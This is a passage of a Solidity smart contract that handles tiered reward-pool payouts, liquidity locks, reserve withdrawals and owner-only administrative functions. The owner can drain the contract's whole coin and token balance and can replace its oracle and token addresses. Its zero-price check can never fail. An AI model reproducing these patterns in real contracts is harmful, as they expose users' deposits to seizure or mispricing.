            for( ; levelGlobalUsersIndex < limit; levelGlobalUsersIndex++){

                rewardInfo[levelGlobalUsers[levelGlobalUsersIndex]].globalPool = rewardInfo[levelGlobalUsers[levelGlobalUsersIndex]].globalPool.add(rewardGlobalUsers);
                userInfo[levelGlobalUsers[levelGlobalUsersIndex]].totalRevenue = userInfo[levelGlobalUsers[levelGlobalUsersIndex]].totalRevenue.add(rewardGlobalUsers);
            }

            if(levelGlobalUsersIndex >= GlobalUsersCount )
            {
                isDistributeGlobalUsers = false;
                rewardGlobalUsers = 0;
            }

        }
        

    }

    function WorkerDistributeDirectorPool() public
    {
        require(msg.sender==rewardPoolCaller,"operation not allowed");

         if(levelDirectorUsersIndex < DirectorUsersCount && isDistributeDirectorUsers)
        {
            uint256 limit=levelDirectorUsersIndex + loopLimit;
            if(DirectorUsersCount<limit)
            {
                limit = DirectorUsersCount;
            }

            for(;levelDirectorUsersIndex < limit; levelDirectorUsersIndex++){

                rewardInfo[levelDirectorUsers[levelDirectorUsersIndex]].directorPool = rewardInfo[levelDirectorUsers[levelDirectorUsersIndex]].directorPool.add(rewardDirectorUsers);
                userInfo[levelDirectorUsers[levelDirectorUsersIndex]].totalRevenue = userInfo[levelDirectorUsers[levelDirectorUsersIndex]].totalRevenue.add(rewardDirectorUsers);

            }

            if(levelDirectorUsersIndex >= DirectorUsersCount )
            {
                isDistributeDirectorUsers = false;
                rewardDirectorUsers = 0;
            }

        }

    }


    function globalmanagerCount() external view returns(uint256){
        return(levelGlobalUsers.length);
    }

    function directorCount() external view returns(uint256){
        return(levelDirectorUsers.length);
    }

    function updateUserLiquidityLock(address user, bytes memory hash,uint256 usdamount, uint256 lpAmount, uint256 tokenAmount, uint256 maticamount) public returns(bool){
        require(msg.sender==liquidityWallet,"operation not allowed");
        reserveLockedLimit[user]=reserveLockedLimit[user].add(usdamount);
        lplockedbalances[user]=lplockedbalances[user].add(lpAmount);
        usdtlockedbalances[user]= usdtlockedbalances[user].add(usdamount);
        lockLiquidityInfo[user].push(LockLiquidityInfo(
            lpAmount,
            tokenAmount,
            maticamount,
            usdamount,
            block.timestamp, 
            hash
        ));

        return true;
    }

    function withdrawLiquidityReserve () public{
        uint256 availableWithdrawableLimit = reserveLockedLimit[msg.sender];
        uint256 availableWithdrawable = withdrawalHold[msg.sender];
        require(availableWithdrawableLimit >= minReserveWithdrawal , "insufficient reserve Limit");
        require(availableWithdrawable >= minReserveWithdrawal , "insufficient reserve Fund");
        if( availableWithdrawable >= availableWithdrawableLimit)
        {
            availableWithdrawable= availableWithdrawableLimit;
        }
        reserveLockedLimit[msg.sender]=reserveLockedLimit[msg.sender].sub(availableWithdrawable);
        withdrawalHold[msg.sender] = withdrawalHold[msg.sender].sub(availableWithdrawable);
        (uint256 price,)=panaRate.getPANA_USDT();
        require( price>= 0,"Zero price");
        uint256 tokenAmount = availableWithdrawable.mul(baseUnit).div(price);

        buToken.transfer(msg.sender, tokenAmount);
    }

    function AddLiquidityLockHash(bytes memory _hash) payable public{
        require(msg.value>=txFee,"Insuffient fee");
        forwardFunds();
        emit LiquidityLockHash(msg.sender,_hash);
    }

    function setTxFee(uint _fee) onlyOwner public{
        txFee = _fee;
    }

    function forwardFunds() internal {
        liquidityWallet.transfer(msg.value);
    }
    
    function updateLiquidityWalletAddress(address payable _liquidityWallet) onlyOwner public {
        liquidityWallet=_liquidityWallet;
    }

    function updateRewardPoolCaller(address payable _rewardPoolCaller) onlyOwner public {
        rewardPoolCaller=_rewardPoolCaller;
    }

    function updateLoopLimit(uint256 _loopLimit) onlyOwner public {
        loopLimit = _loopLimit;
    }

    function withdrawAllMoney() onlyOwner public {
        payable(msg.sender).transfer(address(this).balance);
    }

    function WithdrawToken() onlyOwner external {
        uint256 balance =buToken.balanceOf(address(this)) ;
        buToken.transfer(msg.sender, balance);
    }
    
    function PanaRateUpdate(address  _panaIRateAddress) onlyOwner public {
        panaRate = IRate(_panaIRateAddress);
    }

    function UpdatePanaToken(address  _panaTokenAddress) onlyOwner public {
        buToken = IERC20(_panaTokenAddress);
    }
        
}